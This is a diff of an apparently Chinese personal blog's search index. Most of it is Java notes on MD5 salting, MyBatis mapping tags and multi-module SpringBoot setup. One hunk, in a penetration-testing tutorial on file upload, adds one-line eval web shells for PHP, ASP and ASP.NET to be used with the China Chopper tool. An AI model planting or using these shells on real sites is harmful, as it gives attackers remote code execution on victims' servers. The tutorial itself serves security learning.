@@ -7683,6 +7683,10 @@
 </blockquote>
 <figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> io.github.feiju12138</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.math.BigInteger;</span><br><span class="line"><span class="keyword">import</span> java.security.MessageDigest;</span><br><span class="line"><span class="keyword">import</span> java.security.NoSuchAlgorithmException;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">CodeUtil</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> </span>&#123;</span><br><span class="line">    </span><br><span class="line">        <span class="comment">//创建加密计算器</span></span><br><span class="line">        MessageDigest md5 = <span class="keyword">null</span>;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            md5 = MessageDigest.getInstance(<span class="string">"MD5"</span>);</span><br><span class="line">        &#125; <span class="keyword">catch</span> (NoSuchAlgorithmException e) &#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="comment">//加密</span></span><br><span class="line">        md5.update(<span class="string">"&lt;pwd&gt;"</span>.getBytes());</span><br><span class="line"></span><br><span class="line">        <span class="comment">//转换输出</span></span><br><span class="line">        System.out.println(<span class="keyword">new</span> BigInteger(<span class="number">1</span>, md5.digest()).toString(<span class="number">16</span>));</span><br><span class="line">    </span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
 
+<h2 id="MD5盐值加密"><a href="#MD5盐值加密" class="headerlink" title="MD5盐值加密"></a>MD5盐值加密</h2><h3 id="使用Spring中的工具类"><a href="#使用Spring中的工具类" class="headerlink" title="使用Spring中的工具类"></a>使用Spring中的工具类</h3><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> org.springframework.util.DigestUtils;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.util.UUID;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">CodeUtil</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 产生随机字符串，让此字符串作为一个加密盐</span></span><br><span class="line">        String salt = UUID.randomUUID().toString();</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 将加盐后的密码进行MD5加密并转换为16进制</span></span><br><span class="line">        String password = DigestUtils.md5DigestAsHex((<span class="string">"&lt;pwd&gt;"</span>+salt).getBytes());</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<h3 id="使用Shiro中的工具类"><a href="#使用Shiro中的工具类" class="headerlink" title="使用Shiro中的工具类"></a>使用Shiro中的工具类</h3><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> org.apache.shiro.crypto.hash.SimpleHash;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.util.UUID;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">CodeUtil</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 产生随机字符串，让此字符串作为一个加密盐</span></span><br><span class="line">        String salt = UUID.randomUUID().toString();</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 将加盐后的密码进行MD5加密1次并转换为16进制</span></span><br><span class="line">        SimpleHash simpleHash = <span class="keyword">new</span> SimpleHash(<span class="string">"MD5"</span>, <span class="string">"&lt;pwd&gt;"</span>, salt, <span class="number">1</span>);</span><br><span class="line">        String password = simpleHash.toHex();</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
 <h2 id="完成"><a href="#完成" class="headerlink" title="完成"></a>完成</h2>]]></content>
       <categories>
         <category>Java</category>
@@ -8144,21 +8148,24 @@
 <li><code>${}</code>在接收到数据后，会直接将数据拼接到SQL语句中，适用于指定SQL子句</li>
 <li><code>${}</code>如果指定了POJO对象不存在的成员变量，只能用<a href="/2020/08/20/MyBatis学习笔记/#通过map对象传参">map方式传参</a></li>
 </ul>
-<h2 id="参数"><a href="#参数" class="headerlink" title="参数"></a>参数</h2><h3 id="返回值类型"><a href="#返回值类型" class="headerlink" title="返回值类型"></a>返回值类型</h3><figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">&lt;select resultTypt=<span class="string">""</span>&gt;&lt;/select&gt;</span><br></pre></td></tr></table></figure>
-
-<h2 id="log4j打印日志"><a href="#log4j打印日志" class="headerlink" title="log4j打印日志"></a>log4j打印日志</h2><h3 id="引入log4j"><a href="#引入log4j" class="headerlink" title="引入log4j"></a>引入log4j</h3><ul>
-<li><p>在Maven项目中引入log4j的jar包</p>
-</li>
-<li><p>编辑<code>pom.xml</code>文件</p>
-</li>
-</ul>
-<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>org.slf4j<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>slf4j-log4j12<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">version</span>&gt;</span>1.6.4<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br></pre></td></tr></table></figure>
-
-<h3 id="log4j配置文件"><a href="#log4j配置文件" class="headerlink" title="log4j配置文件"></a>log4j配置文件</h3><ul>
-<li>在<code>src/main/resources</code>目录下新建<code>log4j.properties</code>配置文件</li>
-</ul>
-<figure class="highlight properties"><table><tr><td class="code"><pre><span class="line"><span class="comment"># Global logging configuration</span></span><br><span class="line"><span class="meta">log4j.rootLogger</span>=<span class="string">DEBUG, stdout</span></span><br><span class="line"><span class="comment"># Console output...</span></span><br><span class="line"><span class="meta">log4j.appender.stdout</span>=<span class="string">org.apache.log4j.ConsoleAppender</span></span><br><span class="line"><span class="meta">log4j.appender.stdout.layout</span>=<span class="string">org.apache.log4j.PatternLayout</span></span><br><span class="line"><span class="meta">log4j.appender.stdout.layout.ConversionPattern</span>=<span class="string">%5p [%t] - %m%n</span></span><br></pre></td></tr></table></figure>
-
+<h2 id="标签和参数"><a href="#标签和参数" class="headerlink" title="标签和参数"></a>标签和参数</h2><blockquote>
+<p><code>&lt;select&gt;&lt;/select&gt;</code>：查询语句</p>
+<blockquote>
+<p><code>id</code>：与<code>@Mapper</code>所标注的类中方法名相对应<br><code>resultType</code>：与<code>@Mapper</code>所标注的类中方法返回值类型（的别名）相对应<br><code>resultMap</code>：<a href="/2020/08/20/MyBatis学习笔记/#自定义映射">传送门</a></p>
+</blockquote>
+</blockquote>
+<blockquote>
+<p><code>&lt;insert&gt;&lt;/insert&gt;</code>：插入语句</p>
+<blockquote>
+<p><code>parameterType</code>：实体类的全局限定名<br><code>useGeneratedKeys</code>：值为true时表示使用主键<br><code>keyProperty</code>：指定主键名</p>
+</blockquote>
+</blockquote>
+<blockquote>
+<p><code>&lt;update&gt;&lt;/update&gt;</code>：修改语句<br><code>&lt;delete&gt;&lt;/delete&gt;</code>：删除语句</p>
+</blockquote>
+<blockquote>
+<p><code>&lt;sql&gt;&lt;/sql&gt;</code>：<a href="/2020/08/20/MyBatis学习笔记/#Mybatis的xml实现sql代码的复用">传送门</a></p>
+</blockquote>
 <h2 id="MyBatis动态SQL标签"><a href="#MyBatis动态SQL标签" class="headerlink" title="MyBatis动态SQL标签"></a>MyBatis动态SQL标签</h2><h3 id="if和where标签"><a href="#if和where标签" class="headerlink" title="if和where标签"></a>if和where标签</h3><ul>
 <li><p><code>&lt;if test=&quot;&quot;&gt;&lt;/if&gt;</code>：是根据test属性中的布尔表达式的值，从而决定是否执行包含在其中的SQL片段。如果判断结果为true，则执行其中的SQL片段；如果结果为false，则不执行其中的SQL片段</p>
 </li>
@@ -8256,6 +8263,24 @@
 <li>将<code>mybatis-config.xml</code>内的jdbc注册信息由常量改成变量</li>
 </ul>
 <figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">dataSource</span> <span class="attr">type</span>=<span class="string">"POOLED"</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">property</span> <span class="attr">name</span>=<span class="string">"driver"</span> <span class="attr">value</span>=<span class="string">"$&#123;jdbc.driver&#125;"</span>/&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">property</span> <span class="attr">name</span>=<span class="string">"url"</span> <span class="attr">value</span>=<span class="string">"$&#123;jdbc.url&#125;"</span>/&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">property</span> <span class="attr">name</span>=<span class="string">"username"</span> <span class="attr">value</span>=<span class="string">"$&#123;jdbc.username&#125;"</span>/&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">property</span> <span class="attr">name</span>=<span class="string">"password"</span> <span class="attr">value</span>=<span class="string">"$&#123;jdbc.password&#125;"</span>/&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">dataSource</span>&gt;</span></span><br></pre></td></tr></table></figure>
+
+<h2 id="自定义映射"><a href="#自定义映射" class="headerlink" title="自定义映射"></a>自定义映射</h2><ul>
+<li>resultMap为框架中实现高级映射时采用的一种映射策略</li>
+<li>主要用于表中字段与类中属性不匹配、用于多表嵌套查询、用于多表关联查询</li>
+</ul>
+<h3 id="定义一个查询"><a href="#定义一个查询" class="headerlink" title="定义一个查询"></a>定义一个查询</h3><figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">select</span> <span class="attr">id</span>=<span class="string">""</span> <span class="attr">resultMap</span>=<span class="string">""</span>&gt;</span></span><br><span class="line">    ...</span><br><span class="line"><span class="tag">&lt;/<span class="name">select</span>&gt;</span></span><br></pre></td></tr></table></figure>
+
+<h4 id="一对一"><a href="#一对一" class="headerlink" title="一对一"></a>一对一</h4><blockquote>
+<p><code>resultMap</code>-&gt;<code>id</code>：与查询语句的<code>resultMap</code>值相对应<br><code>resultMap</code>-&gt;<code>type</code>：返回值实体类的全局限定名<br><code>&lt;id&gt;&lt;/id&gt;</code>：主键字段映射<br><code>&lt;result&gt;&lt;/result&gt;</code>：自定义映射<br><code>column</code>：对应的查询到结果的数据表字段<br><code>property</code>：对应的类的属性名</p>
+</blockquote>
+<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">resultMap</span> <span class="attr">id</span>=<span class="string">""</span> <span class="attr">type</span>=<span class="string">""</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">id</span> <span class="attr">property</span>=<span class="string">"id"</span> <span class="attr">column</span>=<span class="string">"id"</span>&gt;</span><span class="tag">&lt;/<span class="name">id</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">result</span> <span class="attr">property</span>=<span class="string">"name"</span> <span class="attr">column</span>=<span class="string">"name"</span>&gt;</span><span class="tag">&lt;/<span class="name">result</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">resultMap</span>&gt;</span></span><br></pre></td></tr></table></figure>
+
+<h4 id="一对多"><a href="#一对多" class="headerlink" title="一对多"></a>一对多</h4><blockquote>
+<p><code>ofType</code>：结果集中每个结果的类型<br><code>collection</code>-&gt;<code>select</code>：嵌套查询。@Mapper所标注的类中方法的全局限定名<br><code>collection</code>-&gt;<code>column</code>与<code>result</code>-&gt;<code>column</code>：均为对应的查询到结果的数据表字段，如果相同可以省略<code>&lt;result&gt;&lt;/result&gt;</code></p>
+</blockquote>
+<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">resultMap</span> <span class="attr">id</span>=<span class="string">""</span> <span class="attr">type</span>=<span class="string">""</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">collection</span> <span class="attr">id</span>=<span class="string">""</span> <span class="attr">column</span>=<span class="string">""</span> <span class="attr">property</span>=<span class="string">""</span> <span class="attr">ofType</span>=<span class="string">""</span> <span class="attr">select</span>=<span class="string">""</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">result</span> <span class="attr">column</span>=<span class="string">""</span>&gt;</span><span class="tag">&lt;/<span class="name">result</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">collection</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">resultMap</span>&gt;</span></span><br></pre></td></tr></table></figure>
+
+<h4 id="多对一"><a href="#多对一" class="headerlink" title="多对一"></a>多对一</h4><figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">resultMap</span> <span class="attr">id</span>=<span class="string">""</span> <span class="attr">type</span>=<span class="string">""</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">association</span> <span class="attr">id</span>=<span class="string">""</span> <span class="attr">column</span>=<span class="string">""</span> <span class="attr">property</span>=<span class="string">""</span> <span class="attr">select</span>=<span class="string">""</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">association</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">resultMap</span>&gt;</span></span><br></pre></td></tr></table></figure>
 
 <h2 id="完成"><a href="#完成" class="headerlink" title="完成"></a>完成</h2>]]></content>
   </entry>
@@ -26551,13 +26576,17 @@
 <blockquote>
 <p><code>用户名</code>：admin<br><code>密码</code>：admin</p>
 </blockquote>
-<h3 id="操作"><a href="#操作" class="headerlink" title="操作"></a>操作</h3><ul>
+<h4 id="php站点"><a href="#php站点" class="headerlink" title="php站点"></a>php站点</h4><ul>
 <li>创建一个<code>.php</code>脚本作为上传的文件，并上传</li>
 </ul>
 <blockquote>
 <p><code>pass</code>：密码</p>
 </blockquote>
-<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> @<span class="keyword">eval</span>($_POST[<span class="string">'pass'</span>]):<span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> @<span class="keyword">eval</span>($_POST[<span class="string">'pass'</span>]);<span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+
+<h4 id="asp站点"><a href="#asp站点" class="headerlink" title="asp站点"></a>asp站点</h4><figure class="highlight php"><table><tr><td class="code"><pre><span class="line">&lt;%<span class="keyword">eval</span> request(<span class="string">"pass"</span>)%&gt;</span><br></pre></td></tr></table></figure>
+
+<h4 id="asp-net站点"><a href="#asp-net站点" class="headerlink" title="asp.net站点"></a>asp.net站点</h4><figure class="highlight php"><table><tr><td class="code"><pre><span class="line">&lt;%@ Page Language=<span class="string">"Jscript"</span>%&gt;&lt;%<span class="keyword">eval</span>(Request.Item[<span class="string">"pass"</span>],<span class="string">"unsafe"</span>);%&gt;</span><br></pre></td></tr></table></figure>
 
 <ul>
 <li><p>在中国菜刀上右键<code>添加</code></p>
@@ -26569,7 +26598,7 @@
 <li><p>右键创建好的shell，进行渗透操作</p>
 </li>
 </ul>
-<h2 id="完成"><a href="#完成" class="headerlink" title="完成"></a>完成</h2><h2 id="参考文献"><a href="#参考文献" class="headerlink" title="参考文献"></a>参考文献</h2><p><a href="https://www.bilibili.com/video/BV1E4411L7zS" target="_blank" rel="noopener">哔哩哔哩——程序学习</a></p>
+<h2 id="未完待更"><a href="#未完待更" class="headerlink" title="未完待更"></a>未完待更</h2><h2 id="参考文献"><a href="#参考文献" class="headerlink" title="参考文献"></a>参考文献</h2><p><a href="https://www.bilibili.com/video/BV1E4411L7zS" target="_blank" rel="noopener">哔哩哔哩——程序学习</a></p>
 ]]></content>
       <categories>
         <category>Penetration Tests</category>
@@ -26874,6 +26903,61 @@
 ]]></content>
       <categories>
         <category>MacOS</category>
+      </categories>
+  </entry>
+  <entry>
+    <title>【笔记】检验软件的md5值</title>
+    <url>/2020/10/20/%E6%A3%80%E9%AA%8C%E8%BD%AF%E4%BB%B6%E7%9A%84md5%E5%80%BC/</url>
+    <content><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="/assets/css/APlayer.min.css"><script src="/assets/js/APlayer.min.js" class="aplayer-secondary-script-marker"></script><h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><ul>
+<li>检验软件的md5值</li>
+</ul>
+<a id="more"></a>
+
+<h2 id="检验"><a href="#检验" class="headerlink" title="检验"></a>检验</h2><blockquote>
+<p><code>&lt;file&gt;</code>：需要检验的文件</p>
+</blockquote>
+<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">md5 &lt;file&gt;</span><br></pre></td></tr></table></figure>
+
+<h2 id="完成"><a href="#完成" class="headerlink" title="完成"></a>完成</h2><h2 id="参考文献"><a href="#参考文献" class="headerlink" title="参考文献"></a>参考文献</h2><p><a href="https://www.jianshu.com/p/2fdffc6aa056" target="_blank" rel="noopener">间书——wealon</a></p>
+]]></content>
+      <categories>
+        <category>MacOS</category>
+      </categories>
+  </entry>
+  <entry>
+    <title>【笔记】IDEA创建多模块的SpringBoot项目</title>
+    <url>/2020/10/21/IDEA%E5%88%9B%E5%BB%BA%E5%A4%9A%E6%A8%A1%E5%9D%97%E7%9A%84SpringBoot%E9%A1%B9%E7%9B%AE/</url>
+    <content><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="/assets/css/APlayer.min.css"><script src="/assets/js/APlayer.min.js" class="aplayer-secondary-script-marker"></script><h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>IDEA创建多模块的SpringBoot项目，通过Maven管理依赖实现模块间的依赖继承</p>
+<a id="more"></a>
+
+<h2 id="父模块"><a href="#父模块" class="headerlink" title="父模块"></a>父模块</h2><ul>
+<li><p>创建一个SpringBoot项目，修改<code>pom.xml</code>文件</p>
+</li>
+<li><p>打包方式改为<code>pom</code></p>
+</li>
+</ul>
+<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">packaging</span>&gt;</span>pom<span class="tag">&lt;/<span class="name">packaging</span>&gt;</span></span><br></pre></td></tr></table></figure>
+
+<ul>
+<li>将子模块加入到<code>&lt;modules&gt;&lt;/modules&gt;</code></li>
+</ul>
+<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">modules</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">module</span>&gt;</span>demo1<span class="tag">&lt;/<span class="name">module</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">module</span>&gt;</span>demo2<span class="tag">&lt;/<span class="name">module</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">modules</span>&gt;</span></span><br></pre></td></tr></table></figure>
+
+<h2 id="子模块"><a href="#子模块" class="headerlink" title="子模块"></a>子模块</h2><ul>
+<li><p>右键父模块，在父模块上创建子模块，修改<code>pom.xml</code>文件</p>
+</li>
+<li><p>将<code>&lt;parent&gt;&lt;/parent&gt;</code>的<code>&lt;groupId&gt;&lt;/groupId&gt;</code>、<code>&lt;artifactId&gt;&lt;/artifactId&gt;</code>、<code>&lt;version&gt;&lt;/version&gt;</code>改为父模块的信息</p>
+</li>
+</ul>
+<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">parent</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>com.cy<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>father<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">version</span>&gt;</span>0.0.1-SNAPSHOT<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">parent</span>&gt;</span></span><br></pre></td></tr></table></figure>
+
+<h2 id="完成"><a href="#完成" class="headerlink" title="完成"></a>完成</h2><ul>
+<li>此时子模块会自动调用父模块的依赖</li>
+</ul>
+<h2 id="参考文献"><a href="#参考文献" class="headerlink" title="参考文献"></a>参考文献</h2><p><a href="https://blog.csdn.net/lhw_csd/article/details/82183008" target="_blank" rel="noopener">CSDN——lhw_csd</a></p>
+]]></content>
+      <categories>
+        <category>Java</category>
       </categories>
   </entry>
 </search>
